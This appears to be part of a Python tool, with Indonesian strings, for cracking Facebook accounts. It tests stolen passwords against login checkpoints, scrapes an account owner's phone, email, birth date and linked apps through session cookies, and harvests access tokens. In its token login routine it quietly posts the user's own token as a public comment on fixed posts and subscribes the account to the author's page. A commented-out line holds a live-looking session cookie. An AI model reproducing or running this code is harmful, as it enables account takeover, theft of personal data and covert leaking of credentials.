			else:continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in run.text:
				print(f" |---->{O}Akun Ini Terkunci..{Q}")
			else:
				print(f" |---->{II}Selamat Akun Ini, Tidak Terkenak Check Point...{Q}")
		elif "checkpoint" in ses.cookies.get_dict():
			eax = re.findall("\<title>(.*?)<\/title>",str(run))
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			ZzZz = f"{str(len(ngew))}"
			if ZzZz == "0":
				print(" |---->Terdapat "+K+str(len(ngew))+Q+" Opsi")
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax:
					print(f" |------->{II}Selamat Akun Ini Tap Yes...{Q}")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):
					print(f" |------->{O}Akun Ini Terkenak A2F{Q}")
				else:
					print(f" |------->{II}{''.join(eax)}{Q}")
			else:
				print(" |---->Terdapat "+K+str(len(ngew))+Q+" Opsi")
				for opt in range(len(ngew)):
					print(f" |------->{O}{str(opt+1)}{Q}. {ngew[opt]}")
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			print(f" |---->{M}{oh}{Q}")
		else:print(f" |---->{M}Kata Sandi Salah...{Q}")

##### Tidak Mengandung Self. #####
def cek_cookies_by_risky(userr, cokii, memek_mamak_yayan):
	kntl_yayan = ""
	user = userr
	akun_nn = memek_mamak_yayan
	session = req.Session()
	kukis_sus = cokii
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	coki = kukis_impos

	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):

		get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
		nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
		response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
		response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
		response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
		response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
		try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
		except:nomer = "-"
		try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
		except:email="-"
		try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
		except:ttl="-"
		try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
		except:teman = "0"
		try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
		except:pengikut = "0"
		try:
			tahun = "-"
			cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
			for nenen in cek_thn:
				tahun += nenen+", "
		except:pass
		kntl_yayan += (f"{Q} |-->Nama Akun       : {O}{nama}{P}\n |-->Jumlah Teman    : {O}{teman}{P}\n |-->Jumlah Pengikut : {O}{pengikut}{P}\n |-->Email Aktif     : {O}{email}{P}\n |-->Nomor Aktif     : {O}{nomer}{P}\n |-->Tahun Akun      : {O}{tahun}{P}\n |-->Tanggal Lahir   : {O}{ttl}{P}\n")

		hit1, hit2 = 0,0
		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
			kntl_yayan += (f" |-->Aplikasi Yang Terkait*\n")
			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
				kntl_yayan += (f" |------>Tidak Ada Aplikasi Aktif Yang Terkait*\n")
			else:
				kntl_yayan += (f" |---->Aplikasi Aktif*\n")
				apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
				ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
				for muncul in apkAktif:
					hit1+=1
					kntl_yayan += (f" |------>{Q}{C}{hit1}{Q}.{I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
					hit2+=1
			if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
				kntl_yayan += (f" |------>Tidak Ada Aplikasi Kedaluwarsa Yang Terkait*\n")
			else:
				hit1,hit2=0,0
				kntl_yayan += (f" |---->Aplikasi Kedaluwarsa*\n")
				apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
				kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
				for muncul in apkKadaluarsa:
					hit1+=1
					kntl_yayan += (f" |------>{Q}{C}{hit1}{Q}.{K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
					hit2+=1
		else:
			kntl_yayan += (f"\r |-->{M}Cookies Error !")
	else:pass
	print(akun_nn+kntl_yayan)










##### LOGIN #####
ses=requests.Session()
def login():
	os.system("clear")
	asa = pilih([B,C,K,U,I,II,O,Q])
	jalan(f"""{asa} _       ___     ___   ___   _  _\n| |     / _ \   / __| |_ _| | \| |\n| |__  | (_) | | (_ |  | |  | .` |\n|____|  \___/   \___| |___| |_|\_|{Q}""")
	jalan(f"[{M}!{Q}]-->{O}Options Login{Q}")
	print(" |-->1. Token");time.sleep(1)
	print(" |-->2. Cookies");time.sleep(1)
	print(" |-->3. Free Token (Non Login)");time.sleep(1)
	print(" |")
	pox = input(war+"Pilih : ")
	print(" |")
	if pox in (""," "):
		jalan(" |-->Jangan Kosong !!");time.sleep(1);login()
	elif pox in ("1","01"):
		tokenz = input(" |-->Token : ")
		token_me(tokenz)
		os.sys.exit()
	elif pox in ("2","02"):
		cokex = input(" |-->Cookie : ")
		user = cokex.split("c_user=")[1]
		try:
			user = user.split(";")[0]
		except:
			user = ""
		kukis_sus = cokex
		kukis_sus = kukis_sus.replace("noscript=1", "")
		kukis_impos = ""
		kukis_sus = kukis_sus.replace("c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
		kukis_sus = kukis_sus.replace(";c_user="+user, "")
		kukis_sus = kukis_sus.replace("c_user="+user, "")
		kukis_impos += kukis_sus
		kukis_impos += ";"
		kukis_impos += "c_user="
		kukis_impos += user
		coki = kukis_impos
		cookie_me(coki)
		os.sys.exit()
	elif pox in ("3","03"):
		free_token()
		os.sys.exit()
	else:
		jalan(" |-->Isi Dengan Benar !!");time.sleep(1);login()

def token_me(token):
	try:
		nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
		open(".login.txt", "w").write(token)
		jalan(f"[{M}!{Q}] Selamat Datang {O}{nama}{Q}.... Semoga Token Anda Awet")
		post4 = ('180923747373969') # Logo Zero From Risky 2021
		post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
		requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
		requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
		requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
		jalan(f" |-->Jalankan Script Lagi !!")
		time.sleep(1)
	except KeyError:
		os.system("rm -f .login.txt")
		jalan(f"[{M}!{Q}]-->Maaf Token Tidak Awet");os.sys.exit()
def cookie_me(cookie):
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		nama = ses.get("https://graph.facebook.com/me?access_token="+find_token.group(1)).json()["name"]
		open(".login.txt", "w").write(find_token.group(1))
		open(".cookie.txt", "w").write(cookie)
		jalan(f"[{M}!{Q}] Selamat Datang {O}{nama}{Q}.... Semoga Token Anda Awet")
		jalan(f" |-->Jalankan Script Lagi !!")
	except Exception as e:
		os.system("rm -f .login.txt")
		os.system("rm -f .cookie.txt")
		print(f"|-->Maaf Cookies Anda Off/{K}Kadaluarsa{Q}")
		os.sys.exit()

def free_token():
	num = 0
	freetoken = []
	url_x = [
			"https://free.facebook.com/100014905842581/posts/1280398002467049/?app=fbl"
			"https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr",
			"https://free.facebook.com/story.php?story_fbid=287175390082137&id=100063690353340&_rdr",
		]
	for link_ in url_x:
		llink_token = ses.get(link_)
		ttoken_free = re.findall("EAA\w+", llink_token.text) 
		for nnaa in ttoken_free:
			num += 1
			if len(nnaa)>=37:
				freetoken.append(nnaa)
				try:
					namax = ses.get(f"https://graph.facebook.com/me?&access_token={nnaa}").json()["name"]
					idz = ses.get(f"https://graph.facebook.com/me?&access_token={nnaa}").json()["id"]
				except:
					namax = "Error 404..."
					idz = "-"
				try:
					goblok = []
					for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+nnaa).json()["data"]:
						try:
							anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
							goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
						except:pass
				except KeyError:pass
				_id = ("%s"%(len(goblok)))
				if _id == "0" or "0" == _id:
					tmnx = f"Tidak Memiliki Teman ({O}Sad{Q})"
				else:
					tmnx = f"Teman : {O}{_id}{Q}"
				if namax == "Error 404...":
					sts = f"Mati/{K}Kadaluarsa{Q}"
				else:
					sts = f"On/{I}Non Kadaluarsa{Q}"
				print(f"[{K}{len(freetoken)}{Q}]-->Nama : {O}{namax}{Q}")
				print(f" |-->Status Token : {sts}")
				print(f" |-->Jumlah Teman : {tmnx}")
				print(f" |-->Idz Akun     : {idz}")
				print(f" |")
				print(f" |-->Token : {O}{nnaa}{Q}")
				print(f" |")
				print(f" |")
	pil = input(f"[{M}?{Q}] Nomor Token : ")
	print(" |")
	if pil in[""," "]:
		login()
	else:
		try:
			xaka = int(pil)
		except:
			jalan(" |-->Masukan Angka Bukan Huruf...");time.sleep(1);login()
		try:
			tolkau = freetoken[int(pil)-1]
#			jalan(" |-->"+tolkau)
			token_me(tolkau)
		except:
			jalan(" |-->Error Saat Memilih Token, Cobalah Cari Token Lain...")
		os.sys.exit()

##### Check Token Apakah Masih Bisa Dump #####
def cek_token_eeq():
	try:
		toket=open(".login.txt","r").read()
	except:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	try:
		ba = (requests.get('https://graph.facebook.com/me/friends?limit=3&fields=name&access_token='+toket).json()["error"]["message"])
	except:
		ba = "Aman"
	if ba in "Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.":
		jalan(" |-->Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara")
		jalan(" |-->Kemungkinan Anda Tidak Bisa Dump/Crack/Ambil Idz")
		jalan(" |-->Apakah Anda Mau Masih Menggunakan Token Ini (Y/n) :")
		la = input(war+"Pilih : ")
		if la in ("Y","y"):
			pass
		else:
			os.remove(".login.txt")
			jalan(war+"Berhasil Hapus Token!")
			os.sys.exit()




class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		version = requests.get("https://raw.githubusercontent.com/Dumai-991/Vvip/Xnxx/version.txt").text.strip()
		if version_ in version:pass
		else:
			jalan(war+"Version Script Ini ("+O+version_+Q+") Akan Diupdate Menjadi ("+O+version+Q+")")
			jalan(" |-->Tunggu Sebentar Sedang Update Script.....")
			os.system('git pull')
			os.sys.exit(war+'Jalankan Lagi Script....')
	def __check_status_(self, mainx):
		mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/Vvip/Xnxx/Status.txt").text.strip()
		if mainx in mainz:pass
		else:
			jalan(war+"Maaf Script Sedang Maintenance Harap Coba Lagi, Lain Waktu.....")
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
		self.__check_update_("1.0.1")
		self.__check_status_("Off")
		cek_token_eeq()
		menu()
	def __vpn__(self):
		menu()
#userf, memek,cokki =  "100078321621691|ima1234|c_user=100078321621691;datr=RsYcYh71TzxmnmoGKT3q6_l1;fr=0uT2SHMrmJO6zVtel.AWWm9cXRlVM48al3CRMMeoME_oE.BiHMZG.rW.AAA.0.0.BiHMZH.AWV3_EAFCnI;sb=RsYcYkKgNVeYeoDfoQoOXr2T;xs=21%3AbgnIVLLnBjpr7A%3A2%3A1646052935%3A-1%3A10820".split('|')
#print(cokki)
#cek_cookies_by_risky(userf, cokki, memek)
Main_().__vpn__()
#cek_info_via_kukis()
